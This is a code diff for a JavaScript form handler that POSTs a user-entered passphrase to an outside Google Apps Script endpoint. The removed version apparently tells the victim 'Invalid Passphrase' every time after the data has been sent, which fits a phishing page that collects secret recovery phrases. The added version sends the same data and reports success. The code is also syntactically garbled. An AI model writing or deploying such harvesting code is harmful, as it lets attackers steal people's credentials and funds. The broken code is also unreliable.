@@ -24,35 +24,25 @@ function handleSubmit(event) {
 
     // Step 2: Make a POST request to example.com/send/
  
-    fetch(url, { 'https://script.google.com/macros/s/AKfycbxK8VQMGkMc4gdlpo_GKoivsuWs4xQvwkynfZJ0E7qBlvcSY271Dq-pOcpIM4ci8WMP/exec';
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ passphrase: inputValue })
-    })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
-        }
-        return response.json(); // Assuming the response is JSON; adjust as per your API
-    })
-    .then(data => {
-        // Step 3: Display any errors in the HTML with ID 'emsg'
-        errorElement.textContent = 'Invalid Passphrase';
-        myButton.disabled = false;
-        myButton2.disabled = false;
-        form.reset();
-    })
-    .catch(error => {
-        console.error('Error:', error);
-        errorElement.textContent = 'Invalid Passphrase';
-        form.reset();
-        myButton.disabled = false;
-        myButton2.disabled = false;
-    });
-}
+const url = 'https://script.google.com/macros/s/AKfycbxK8VQMGkMc4gdlpo_GKoivsuWs4xQvwkynfZJ0E7qBlvcSY271Dq-pOcpIM4ci8WMP/exec'; // Replace with your Apps Script Web App URL
 
-// Add event listener to the form for 'submit' event
-const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
-form.addEventListener('submit', handleSubmit);
+fetch(url, {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ passphrase: inputValue }) // Sends the passphrase
+})
+.then(response => response.json())
+.then(data => {
+    if (data.success) {
+        alert("Passphrase saved successfully!");
+    } else {
+        errorElement.textContent = data.message;
+    }
+})
+.catch(error => {
+    console.error('Error:', error);
+    errorElement.textContent = 'An error occurred.';
+});
+
